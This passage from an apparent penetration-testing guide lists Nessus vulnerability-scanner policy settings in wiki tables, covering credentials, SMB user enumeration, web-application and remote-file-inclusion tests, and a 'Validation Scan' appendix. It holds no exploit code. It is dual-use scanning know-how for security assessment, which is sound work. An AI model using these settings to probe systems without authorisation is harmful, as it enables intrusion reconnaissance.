|SSH password (unsafe!)
|Blank</p>
<p>|-
|SSH public key to use
|Blank</p>
<p>|-
|SSH private key to use
|Blank</p>
<p>|-
|Passphrase for SSH key
|Blank</p>
<p>|-
|Elevate privileges with
|Nothing</p>
<p>|-
|su login
|Blank</p>
<p>|-
|Escalation password
|Blank</p>
<p>|-
|SSH known_hosts file 
|Blank</p>
<p>|-
|Preferred SSH port
|22</p>
<p>|-
|Client version
|OpenSSH_5.0</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Kerberos configuration'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Kerberos Key Distribution Center (KDC) 
|Blank</p>
<p>|-
|Kerberos KDC Port
|88</p>
<p>|-
|Kerberos KDC Transport
|UDP</p>
<p>|-
|Kerberos Realm (SSH only)
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Cleartext protocols settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|User name
|Blank</p>
<p>|-
|Password (unsafe!)
|Blank</p>
<p>|-
|Try to perform patch level checks over telnet 
|Unchecked</p>
<p>|-
|Try to perform patch level checks over rsh
|Unchecked</p>
<p>|-
|Try to perform patch level checks over rexec
|Unchecked</p>
<p>|}</p>
<h2 id="plugins_2">Plugins</h2>
<p>The Plugins tab, allows us to choose specific security checks by plugin family or individual checks that we want to enable.  The easiest way to set this is to select the "Enable All" button from the main Plugins tab, however this assumes the Safe Checks is selected from the General Tab.</p>
<h2 id="preferences_2">Preferences</h2>
<p>The Preferences tab allows for more granular control over scan settings.  All items in this category should be.  The actual settings have been defined as indicated below:</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Cisco IOS Compliance Checks'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Database Compliance Checks '''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Database Settings '''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Login 
|Blank </p>
<p>|-
|Password
|Blank</p>
<p>|-
|DB Type
|Oracle</p>
<p>|-
|Database SID
|Blank</p>
<p>|-
|Database port to use
|Blank</p>
<p>|-
|Oracle auth type
|NORMAL </p>
<p>|-
|SQL Server auth type
|Windows </p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Do not scan fragile devices'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Scan Network Printers 
|Unchecked</p>
<p>|-
|Scan Novell Netware hosts 
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Global variable settings'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Probe services on every port 
|Checked</p>
<p>|-
|Do not log in with user accounts not<br>specified in the policy
|Unchecked</p>
<p>|-
|Enable CGI scanning
|Checked</p>
<p>|-
|Network type
|Mixed (use RFC 1918) </p>
<p>|-
|Enable experimental scripts 
|Unchecked</p>
<p>|-
|Thorough tests (slow) 
|Unchecked</p>
<p>|-
|Report verbosity 
|Normal</p>
<p>|-
|Report paranoia 
|Normal</p>
<p>|-
|HTTP User-Agent 
|Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)</p>
<p>|-
|SSL certificate to use 
|Blank</p>
<p>|-
|SSL CA to trust 
|Blank</p>
<p>|-
|SSL key to use 
|Blank</p>
<p>|-
|SSL password for SSL key 
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''HTTP cookies import'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Cookies file
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''HTTP login page'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Login page 
|/</p>
<p>|-
|Login form 
|Blank</p>
<p>|-
|Login form fields 
|user#%USER%&amp;password#%PASS%</p>
<p>|-
|Login form method
|POST</p>
<p>|-
|Re-authenticate delay (seconds) 
|Blank</p>
<p>|-
|Check authentication on page 
|Blank</p>
<p>|-
|Follow 30x redirections (# of levels) 
|2 </p>
<p>|-
|Authenticated regex 
|Blank</p>
<p>|-
|Invert test (disconnected if regex matches) 
|Unchecked</p>
<p>|-
|Match regex on HTTP headers 
|Unchecked</p>
<p>|-
|Case insensitive regex 
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''ICCP/COTP TSAP Addressing'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start COTP TSAP
|8</p>
<p>|-
|Stop COTP TSAP
|8</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Login configurations'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|HTTP account 
|Blank</p>
<p>|-
|HTTP password (sent in clear)
|Blank</p>
<p>|-
|NNTP account
|Blank</p>
<p>|-
|NNTP password (sent in clear)
|Blank</p>
<p>|-
|FTP account
|Anonymous</p>
<p>|-
|FTP password (sent in clear)
|&nbsp;</p>
<p>|-
|FTP writeable directory
|/incoming</p>
<p>|-
|POP2 account
|Blank</p>
<p>|-
|POP2 password (sent in clear)
|Blank</p>
<p>|-
|POP3 account
|Blank</p>
<p>|-
|POP3 password (sent in clear)
|Blank</p>
<p>|-
|IMAP account
|Blank</p>
<p>|-
|IMAP password (sent in clear)
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Modbus/TCP Coil Access'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start reg
|0</p>
<p>|-
|End reg
|16</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Nessus SYN scanner'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Firewall detection
|Automatic (normal)</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Nessus TCP scanner'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Firewall detection
|Automatic (normal)</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''News Server (NNTP) Information Disclosure'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|From address 
|Nessus <nowiki>&lt;</nowiki><a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#108;&#105;&#115;&#116;&#109;&#101;&#64;&#108;&#105;&#115;&#116;&#109;&#101;&#46;&#100;&#115;&#98;&#108;&#46;&#111;&#114;&#103;">&#108;&#105;&#115;&#116;&#109;&#101;&#64;&#108;&#105;&#115;&#116;&#109;&#101;&#46;&#100;&#115;&#98;&#108;&#46;&#111;&#114;&#103;</a><nowiki>&gt;</nowiki></p>
<p>|-
|Test group name regex 
|f<nowiki>[</nowiki>a-z<nowiki>]</nowiki>.tests? </p>
<p>|-
|Max crosspost 
|7 </p>
<p>|-
|Local distribution 
|Checked</p>
<p>|-
|No archive 
|Unchecked </p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Nikto (NASL wrapper)'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Enable Nikto
|Checked</p>
<p>|-
|Disable if server never replies 404
|Unchecked</p>
<p>|-
|Root directory
|Blank</p>
<p>|-
|Pause between tests (s)
|Blank</p>
<p>|-
|Scan CGI directories
|User supplied</p>
<p>|-
|Display: 1 Show redirects
|Unchecked</p>
<p>|-
|Display: 2 Show cookies received
|Unchecked</p>
<p>|-
|Display: 3 Show all 200/OK responses
|Unchecked</p>
<p>|-
|Display: 4 Show URLs which require authentication
|Unchecked</p>
<p>|-
|Display: V Verbose Output
|Unchecked</p>
<p>|-
|Tuning: 1 Interesting File/Seen in logs
|Unchecked</p>
<p>|-
|Tuning: 2 Misconfiguration / Default File
|Unchecked</p>
<p>|-
|Tuning: 3 Information Disclosure
|Unchecked</p>
<p>|-
|Tuning: 4 Injection (XSS/Script/HTML)
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Oracle Settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Oracle SID
|Blank</p>
<p>|-
|Test default accounts (slow)
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''PCI DSS Compliance'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Check for PCI-DSS compliance
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Ping the remote host'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|TCP ping destination port(s) 
|Built-in</p>
<p>|-
|Do an ARP ping
|Checked</p>
<p>|-
|Do a TCP ping
|Checked</p>
<p>|-
|Do an ICMP ping
|Checked</p>
<p>|-
|Number of Retries (ICMP)
|2</p>
<p>|-
|Do an applicative UDP ping (DNS, RPCÖ)
|Unchecked</p>
<p>|-
|Make the dead hosts appear in the report
|Unchecked</p>
<p>|-
|Log live hosts in the report
|Unchecked</p>
<p>|-
|Test the local Nessus host
|Checked</p>
<p>|-
|Fast network discovery
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Port scanners settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Check open TCP ports found by local port enumerators
|Unchecked</p>
<p>|-
|Only run network port scanners if local port enumeration failed
|Checked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMB Registry: Start the Registry Service during the scan'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start the Registry Service during the scan
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMB Scope'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Request information about the domain
|Checked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMB use domain SID to enumerate users'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start UID
|1000</p>
<p>|-
|End UID
|1200</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMB use host SID to enumerate local users'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start UID
|1000</p>
<p>|-
|End UID
|1200</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMTP settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Third party domain
|Example.com</p>
<p>|-
|From address
|<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#110;&#111;&#98;&#111;&#100;&#121;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;">&#110;&#111;&#98;&#111;&#100;&#121;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;</a></p>
<p>|-
|To address
|postmaster@<nowiki>[</nowiki>AUTO_REPLACED_IP<nowiki>]</nowiki></p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SNMP settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Community name
|Public</p>
<p>|-
|UDP port
|161</p>
<p>|-
|SNMPv3 user name
|Blank</p>
<p>|-
|SNMPv3 authentication password
|Blank</p>
<p>|-
|SNMPv3 authentication algorithm
|MD5</p>
<p>|-
|SNMPv3 privacy password
|Blank</p>
<p>|-
|SNMPv3 privacy algorithm
|DES</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Service Detection'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Test SSL based services
|Known SSL ports</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Unix Compliance Checks'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Web Application Tests Settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Enable web applications tests
|Checked</p>
<p>|-
|Maximum run time (min)
|60</p>
<p>|-
|Send POST requests
|Unchecked</p>
<p>|-
|Combinations of arguments values
|one value</p>
<p>|-
|HTTP Parameter Pollution
|Unchecked</p>
<p>|-
|Stop at first flaw
|Per port (quicker)</p>
<p>|-
|Test embedded web servers
|Unchecked</p>
<p>|-
|URL for Remote File Inclusion
|<a href="http://rfi.nessus.org/rfi.txt">http://rfi.nessus.org/rfi.txt</a></p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Web mirroring'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Number of pages to mirror
|1000</p>
<p>|-
|Maximum depth
|6</p>
<p>|-
|Start page
|/</p>
<p>|-
|Excluded items regex
|/server_privileges.php</p>
<p>|-
|Follow dynamic pages
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Windows Compliance Checks'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Windows File Contents Compliance Checks'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|}</p>
<h1 id="appendix-d-creating-the-validation-scan-policy">Appendix D - Creating the "Validation Scan" Policy</h1>
<p>In order to ensure that all tests are conducted with the same criteria, you will need to ensure that you have created a policy called "Validation Scan."  In order to do this you will need to connect to the Nessus server UI, so that you can create a custom policy by clicking on the "Policies" option on the bar at the top and then "<nowiki>+</nowiki> Add" button on the right.  The "Add Policy" screen will be displayed as follows:<br></p>
<p>[[:File:Penetration_Testing_Execution_164.png|Screenshot Here]]
''' <br>'''</p>
<p>There are four configuration tabs: General, Credentials, Plugins, and Preferences.  For our purposes, most of the default settings do not need to be modified.</p>
<h2 id="general_3">General</h2>
<p>The General tab is where we will name and configure scan options related to our policy.  There are six boxes of grouped options that control scanner behavior: Basic, Scan, Network Congestion, Port Scanners, Port Scan Options, and Performance.</p>
<p>Basic allows us to define the policy itself.  The actual settings have been defined as indicated below:</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Basic Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Name 
|Validation Scan</p>
<p>|-
|Visibility 
|Shared </p>
<p>|-
|Description 
|Validation Scan Only (Use to check that Nessus is working properly and the signature date)<br></p>
<p>|-
|<u>'''Scan Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Save Knowledge Base 
|Checked</p>
<p>|-
|Safe Checks 
|Checked</p>
<p>|-
|Silent Dependencies 
|Checked</p>
<p>|-
|Log Scan Details to Server 
|Unchecked</p>
<p>|-
|Stop Host Scan on Disconnect 
|Unchecked</p>
<p>|-
|Avoid Sequential Scans 
|Unchecked</p>
<p>|-
|Consider Unscanned Ports as Closed 
|Unchecked</p>
<p>|-
|Designate Hosts by their DNS Name 
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Network Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Reduce Parallel Connections on Congestion 
|Unchecked</p>
<p>|-
|Use Kernel Congestion Detection (Linux Only) 
|Unchecked </p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Port Scanners Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|TCP Scan 
|Checked</p>
<p>|-
|UDP Scan 
|Unchecked </p>
<p>|-
|SYN Scan
|Unchecked</p>
<p>|-
|SNMP Scan
|Unchecked</p>
<p>|-
|Netstat SSH Scan 
|Checked</p>
<p>|-
|Netstat WMI Scan 
|Checked</p>
<p>|-
|Ping Host 
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Port Scan Options Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Port Scan Range<br />
|22, 161, 1241, 8834<br></p>
<p>|-
|<u>'''Performance Section'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Max Checks Per Host (Windows)
|5 </p>
<p>|-
|Max Checks Per Host (Linux) 
|50-75 </p>
<p>|-
|Max Hosts Per Scan 
|1</p>
<p>|-
|Network Receive Timeout (seconds) 
|5 </p>
<p>|-
|Max Simultaneous TCP Sessions Per Host 
|Unlimited </p>
<p>|-
|Max Simultaneous TCP Sessions Per Scan 
|Unlimited </p>
<p>|}</p>
<h2 id="credentials_3">Credentials</h2>
<p>The Credentials tab, allows us to configure the Nessus scanner to use authentication credentials during scanning.  For our policy we will not edit any of the settings within this section.  They are however documented to ensure completeness.</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Windows credentials'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|SMB account
|Blank</p>
<p>|-
|SMB password
|Blank</p>
<p>|-
|SMB domain (optional)
|Blank</p>
<p>|-
|SMB password type
|Password</p>
<p>|-
|Additional SMB account (1)
|Blank</p>
<p>|-
|Additional SMB password (1)
|Blank</p>
<p>|-
|Additional SMB domain (optional)(1)
|Blank</p>
<p>|-
|Additional SMB account (2)
|Blank</p>
<p>|-
|Additional SMB password (2)
|Blank</p>
<p>|-
|Additional SMB domain (optional)(2)
|Blank</p>
<p>|-
|Additional SMB account (3)
|Blank</p>
<p>|-
|Additional SMB password (3)
|Blank</p>
<p>|-
|Additional SMB domain (optional)(3)
|Blank</p>
<p>|-
|Never send SMB credentials in clear text
|Checked</p>
<p>|-
|Only use NTLMv2
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SSH Settings '''</u>
|<u>'''Setting'''</u></p>
<p>|-
|SSH user name 
|root</p>
<p>|-
|SSH password (unsafe!)
|Blank</p>
<p>|-
|SSH public key to use
|Blank</p>
<p>|-
|SSH private key to use
|Blank</p>
<p>|-
|Passphrase for SSH key
|Blank</p>
<p>|-
|Elevate privileges with
|Nothing</p>
<p>|-
|su login
|Blank</p>
<p>|-
|Escalation password
|Blank</p>
<p>|-
|SSH known_hosts file 
|Blank</p>
<p>|-
|Preferred SSH port
|22</p>
<p>|-
|Client version
|OpenSSH_5.0</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Kerberos configuration'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Kerberos Key Distribution Center (KDC) 
|Blank</p>
<p>|-
|Kerberos KDC Port
|88</p>
<p>|-
|Kerberos KDC Transport
|UDP</p>
<p>|-
|Kerberos Realm (SSH only)
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Cleartext protocols settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|User name
|Blank</p>
<p>|-
|Password (unsafe!)
|Blank</p>
<p>|-
|Try to perform patch level checks over telnet 
|Unchecked</p>
<p>|-
|Try to perform patch level checks over rsh
|Unchecked</p>
<p>|-
|Try to perform patch level checks over rexec
|Unchecked</p>
<p>|}</p>
<h2 id="plugins_3">Plugins</h2>
<p>The Plugins tab, allows us to choose specific security checks by plugin family or individual checks that we want to enable.  The easiest way to set this is to select the "Enable All" button from the main Plugins tab, however this assumes the Safe Checks is selected from the General Tab.</p>
<h2 id="preferences_3">Preferences</h2>
<p>The Preferences tab allows for more granular control over scan settings.  All items in this category should be.  The actual settings have been defined as indicated below:</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Cisco IOS Compliance Checks'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Database Compliance Checks '''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Policy file #1
|Blank</p>
<p>|-
|Policy file #2
|Blank</p>
<p>|-
|Policy file #3
|Blank</p>
<p>|-
|Policy file #4
|Blank</p>
<p>|-
|Policy file #5
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Database Settings '''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Login 
|Blank </p>
<p>|-
|Password
|Blank</p>
<p>|-
|DB Type
|Oracle</p>
<p>|-
|Database SID
|Blank</p>
<p>|-
|Database port to use
|Blank</p>
<p>|-
|Oracle auth type
|NORMAL </p>
<p>|-
|SQL Server auth type
|Windows </p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Do not scan fragile devices'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Scan Network Printers 
|Unchecked</p>
<p>|-
|Scan Novell Netware hosts 
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Global variable settings'''</u>
|<u>'''Setting'''</u></p>
<p>|-
|Probe services on every port 
|Checked</p>
<p>|-
|Do not log in with user accounts not<br>specified in the policy
|Unchecked</p>
<p>|-
|Enable CGI scanning
|Checked</p>
<p>|-
|Network type
|Mixed (use RFC 1918) </p>
<p>|-
|Enable experimental scripts 
|Unchecked</p>
<p>|-
|Thorough tests (slow) 
|Unchecked</p>
<p>|-
|Report verbosity 
|Normal</p>
<p>|-
|Report paranoia 
|Normal</p>
<p>|-
|HTTP User-Agent 
|Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)</p>
<p>|-
|SSL certificate to use 
|Blank</p>
<p>|-
|SSL CA to trust 
|Blank</p>
<p>|-
|SSL key to use 
|Blank</p>
<p>|-
|SSL password for SSL key 
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''HTTP cookies import'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Cookies file
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''HTTP login page'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Login page 
|/</p>
<p>|-
|Login form 
|Blank</p>
<p>|-
|Login form fields 
|user#%USER%&amp;password#%PASS%</p>
<p>|-
|Login form method
|POST</p>
<p>|-
|Re-authenticate delay (seconds) 
|Blank</p>
<p>|-
|Check authentication on page 
|Blank</p>
<p>|-
|Follow 30x redirections (# of levels) 
|2 </p>
<p>|-
|Authenticated regex 
|Blank</p>
<p>|-
|Invert test (disconnected if regex matches) 
|Unchecked</p>
<p>|-
|Match regex on HTTP headers 
|Unchecked</p>
<p>|-
|Case insensitive regex 
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''ICCP/COTP TSAP Addressing'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start COTP TSAP
|8</p>
<p>|-
|Stop COTP TSAP
|8</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Login configurations'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|HTTP account 
|Blank</p>
<p>|-
|HTTP password (sent in clear)
|Blank</p>
<p>|-
|NNTP account
|Blank</p>
<p>|-
|NNTP password (sent in clear)
|Blank</p>
<p>|-
|FTP account
|Anonymous</p>
<p>|-
|FTP password (sent in clear)
|&nbsp;</p>
<p>|-
|FTP writeable directory
|/incoming</p>
<p>|-
|POP2 account
|Blank</p>
<p>|-
|POP2 password (sent in clear)
|Blank</p>
<p>|-
|POP3 account
|Blank</p>
<p>|-
|POP3 password (sent in clear)
|Blank</p>
<p>|-
|IMAP account
|Blank</p>
<p>|-
|IMAP password (sent in clear)
|Blank</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Modbus/TCP Coil Access'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start reg
|0</p>
<p>|-
|End reg
|16</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Nessus SYN scanner'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Firewall detection
|Automatic (normal)</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Nessus TCP scanner'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Firewall detection
|Automatic (normal)</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''News Server (NNTP) Information Disclosure'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|From address 
|Nessus <nowiki>&lt;</nowiki><a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#108;&#105;&#115;&#116;&#109;&#101;&#64;&#108;&#105;&#115;&#116;&#109;&#101;&#46;&#100;&#115;&#98;&#108;&#46;&#111;&#114;&#103;">&#108;&#105;&#115;&#116;&#109;&#101;&#64;&#108;&#105;&#115;&#116;&#109;&#101;&#46;&#100;&#115;&#98;&#108;&#46;&#111;&#114;&#103;</a><nowiki>&gt;</nowiki></p>
<p>|-
|Test group name regex 
|f<nowiki>[</nowiki>a-z<nowiki>]</nowiki>.tests? </p>
<p>|-
|Max crosspost 
|7 </p>
<p>|-
|Local distribution 
|Checked</p>
<p>|-
|No archive 
|Unchecked </p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Nikto (NASL wrapper)'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Enable Nikto
|Checked</p>
<p>|-
|Disable if server never replies 404
|Unchecked</p>
<p>|-
|Root directory
|Blank</p>
<p>|-
|Pause between tests (s)
|Blank</p>
<p>|-
|Scan CGI directories
|User supplied</p>
<p>|-
|Display: 1 Show redirects
|Unchecked</p>
<p>|-
|Display: 2 Show cookies received
|Unchecked</p>
<p>|-
|Display: 3 Show all 200/OK responses
|Unchecked</p>
<p>|-
|Display: 4 Show URLs which require authentication
|Unchecked</p>
<p>|-
|Display: V Verbose Output
|Unchecked</p>
<p>|-
|Tuning: 1 Interesting File/Seen in logs
|Unchecked</p>
<p>|-
|Tuning: 2 Misconfiguration / Default File
|Unchecked</p>
<p>|-
|Tuning: 3 Information Disclosure
|Unchecked</p>
<p>|-
|Tuning: 4 Injection (XSS/Script/HTML)
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Oracle Settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Oracle SID
|Blank</p>
<p>|-
|Test default accounts (slow)
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''PCI DSS Compliance'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Check for PCI-DSS compliance
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Ping the remote host'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|TCP ping destination port(s) 
|Built-in</p>
<p>|-
|Do an ARP ping
|Checked</p>
<p>|-
|Do a TCP ping
|Checked</p>
<p>|-
|Do an ICMP ping
|Checked</p>
<p>|-
|Number of Retries (ICMP)
|2</p>
<p>|-
|Do an applicative UDP ping (DNS, RPCÖ)
|Unchecked</p>
<p>|-
|Make the dead hosts appear in the report
|Unchecked</p>
<p>|-
|Log live hosts in the report
|Unchecked</p>
<p>|-
|Test the local Nessus host
|Checked</p>
<p>|-
|Fast network discovery
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''Port scanners settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Check open TCP ports found by local port enumerators
|Unchecked</p>
<p>|-
|Only run network port scanners if local port enumeration failed
|Checked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMB Registry: Start the Registry Service during the scan'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start the Registry Service during the scan
|Unchecked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMB Scope'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Request information about the domain
|Checked</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMB use domain SID to enumerate users'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start UID
|1000</p>
<p>|-
|End UID
|1200</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMB use host SID to enumerate local users'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Start UID
|1000</p>
<p>|-
|End UID
|1200</p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SMTP settings'''</u>
|<u>'''Settings'''</u></p>
<p>|-
|Third party domain
|Example.com</p>
<p>|-
|From address
|<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#110;&#111;&#98;&#111;&#100;&#121;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;">&#110;&#111;&#98;&#111;&#100;&#121;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;</a></p>
<p>|-
|To address
|postmaster@<nowiki>[</nowiki>AUTO_REPLACED_IP<nowiki>]</nowiki></p>
<p>|-
|&nbsp;
|&nbsp;</p>
<p>|-
|<u>'''SNMP settings'''</u>
